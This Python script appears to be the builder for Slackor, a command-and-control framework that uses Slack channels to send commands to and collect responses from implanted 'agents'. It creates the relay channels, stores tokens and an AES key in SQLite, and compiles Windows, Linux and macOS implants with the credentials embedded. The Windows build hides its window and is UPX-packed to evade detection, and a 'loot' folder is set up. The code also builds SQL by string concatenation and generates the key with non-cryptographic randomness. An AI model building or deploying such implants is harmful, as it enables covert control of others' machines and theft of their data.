import hashlib
import json
import os
import random
import requests
import sqlite3
import subprocess
import sys

# Initialize variables
commands = None
responses = None
registration = None

# Create directories
if not os.path.exists("loot"):
    os.mkdir("loot")
if not os.path.exists("output"):
    os.mkdir("output")

print("First you must also create a Slack bot.\n"
    "Ensure your Slack app has these permissions before you continue:\nBot:\n"
    "\nchannels:history\nchannels:read\nchannels:write \nchat:write:\nusers:read\n"
    "User:\nchannels:history\nchannels:write\nfiles:read\nfiles:write")
token = input("Enter the OAuth Access Token: ")
bearer = input("Enter the Bot User OAuth Access Token: ")

print("OAuth Access Token: " + token)
print("Bot User OAuth Access Token: " + bearer)

print("Attempting to create Slack channels...")

# Check if channels exist
headers = {'Authorization': 'Bearer ' + bearer}
data = {"token": token, "name": "commands", "validate": "True"}
r = requests.get('https://slack.com/api/conversations.list', headers=headers)
result = json.loads(r.text)
for channel in result["channels"]:
        if channel["name"] == "commands":
            commands = channel["id"]
            print("Existing commands channel found")
        if channel["name"] == "registration":
            registration = channel["id"]
            print("Existing registration channel found")
        if channel["name"] == "responses":
            responses = channel["id"]
            print("Existing response channel found")

# Create channels
headers = {'Authorization': 'Bearer ' + bearer}
if commands is None:
    data = {"token": token, "name": "commands", "validate": "True"}
    r = requests.post('https://slack.com/api/conversations.create', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        commands = result["channel"]["id"]
        print("Commands channel: " + commands)
    except KeyError:
        print(result)
        print("Commands channel already exists, log into Slack and delete it manually")
        print("Go to: Channel Settings -> Additional Options - > Delete this Channel")
        #sys.exit()

if responses is None:
    data = {"token": token, "name": "responses"}
    r = requests.post('https://slack.com/api/conversations.create', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        responses = result["channel"]["id"]
        print("Responses channel: " + responses)
    except KeyError:
        print("Responses channel already exists, log into Slack and delete it manually")
        print("Go to: Channel Settings -> Additional Options - > Delete this Channel")
        #sys.exit()

if registration is None:
    data = {"token": token, "name": "registration"}
    r = requests.post('https://slack.com/api/conversations.create', headers=headers, data=data)
    result = json.loads(r.text)
    try:
        registration = result["channel"]["id"]
        print("Registration channel: " + registration)
    except KeyError:
        print("Registration channel already exists, log into Slack and delete it manually")
        print("Go to: Channel Settings -> Additional Options - > Delete this Channel")
        #sys.exit()

# Invite bot user to created channels
data = {"token": token}
r = requests.get('https://slack.com/api/users.list', headers=headers)
result = json.loads(r.text)
slackusers = []
for user in result["members"]:
    if user["is_bot"]:
        slackusers.append(user["id"])
for channel in [commands, responses, registration]:
    data = {"token": token, "channel": channel, "users": ','.join(slackusers)}
    r = requests.post('https://slack.com/api/conversations.invite', headers=headers, data=data)
    print("Added bot account to channel " + channel)

# If a database already exists, remove it
try:
    os.remove('slackor.db')
    print("Deleting current database...")
except OSError:
    pass
conn = sqlite3.connect('slackor.db')
print("Creating AES key...")
aes_key = ''.join(random.choice('0123456789ABCDEF') for n in range(32))
print(aes_key)
print("Created new database file...")
print("Putting keys in the database...")
# Create table for  keys
conn.execute('''CREATE TABLE KEYS
         (ID TEXT PRIMARY KEY     NOT NULL,
         TOKEN           TEXT    NOT NULL,
         BEARER           TEXT    NOT NULL,
         AES            TEXT     NOT NULL);''')
conn.execute("INSERT INTO KEYS (ID,TOKEN,BEARER,AES) VALUES ('1', '" + token + "','" + bearer + "','" + aes_key + "')")

print("Adding slack channels to the database...")

# Create table for channels
conn.execute('''CREATE TABLE CHANNELS
         (ID TEXT PRIMARY KEY     NOT NULL,
         COMMANDS           TEXT    NOT NULL,
         RESPONSES            TEXT     NOT NULL,
         REGISTRATION        TEXT);''')
conn.execute("INSERT INTO CHANNELS (ID,COMMANDS,RESPONSES,REGISTRATION) VALUES ('1', '" + commands + "','"
             + responses + "','" + registration + "')")

# Create table for holding agents
conn.execute('''CREATE TABLE AGENTS
         (ID TEXT PRIMARY KEY     NOT NULL,
         HOSTNAME           TEXT    NOT NULL,
         USER           TEXT    NOT NULL,
         IP            TEXT     NOT NULL,
         VERSION        TEXT);''')
conn.commit()
conn.close()
print("Database created successfully")

# Build exe and pack with UPX
subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=windows GOARCH=amd64 go build -o dist/agent.windows.exe -ldflags \"-s -w -H windowsgui -X github.com/n00py/Slackor/internal/config.ResponseChannel=%s -X github.com/n00py/Slackor/internal/config.RegistrationChannel=%s -X github.com/n00py/Slackor/internal/config.CommandsChannel=%s -X github.com/n00py/Slackor/internal/config.Bearer=%s -X github.com/n00py/Slackor/internal/config.Token=%s -X github.com/n00py/Slackor/internal/config.CipherKey=%s -X github.com/n00py/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
subprocess.run(["bash", "-c", "cp -p dist/agent.windows.exe dist/agent.upx.exe"])
subprocess.run(["bash", "-c", "upx --force dist/agent.upx.exe"])

# Build for linux and macOS
subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=linux GOARCH=amd64 go build -o dist/agent.64.linux -ldflags \"-s -w -X github.com/n00py/Slackor/internal/config.ResponseChannel=%s -X github.com/n00py/Slackor/internal/config.RegistrationChannel=%s -X github.com/n00py/Slackor/internal/config.CommandsChannel=%s -X github.com/n00py/Slackor/internal/config.Bearer=%s -X github.com/n00py/Slackor/internal/config.Token=%s -X github.com/n00py/Slackor/internal/config.CipherKey=%s -X github.com/n00py/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=linux GOARCH=386 go build -o dist/agent.32.linux -ldflags \"-s -w -X github.com/n00py/Slackor/internal/config.ResponseChannel=%s -X github.com/n00py/Slackor/internal/config.RegistrationChannel=%s -X github.com/n00py/Slackor/internal/config.CommandsChannel=%s -X github.com/n00py/Slackor/internal/config.Bearer=%s -X github.com/n00py/Slackor/internal/config.Token=%s -X github.com/n00py/Slackor/internal/config.CipherKey=%s -X github.com/n00py/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])
subprocess.run(["bash", "-c", "GO111MODULE=on GOOS=darwin GOARCH=amd64 go build -o dist/agent.darwin -ldflags \"-s -w -X github.com/n00py/Slackor/internal/config.ResponseChannel=%s -X github.com/n00py/Slackor/internal/config.RegistrationChannel=%s -X github.com/n00py/Slackor/internal/config.CommandsChannel=%s -X github.com/n00py/Slackor/internal/config.Bearer=%s -X github.com/n00py/Slackor/internal/config.Token=%s -X github.com/n00py/Slackor/internal/config.CipherKey=%s -X github.com/n00py/Slackor/internal/config.SerialNumber=%s\" agent.go" % (responses, registration, commands, bearer, token, aes_key, '%0128x' % random.randrange(16**128))])

# Print hashes
filenames = ["dist/agent.windows.exe", "dist/agent.upx.exe", "dist/agent.64.linux", "dist/agent.32.linux", "dist/agent.darwin"]
for filename in filenames:
    # TODO: use buffers/hash update if the agent ever gets big
    f = open(filename, 'rb').read()
    h = hashlib.sha256(f).hexdigest()
    print(h + "  " + filename)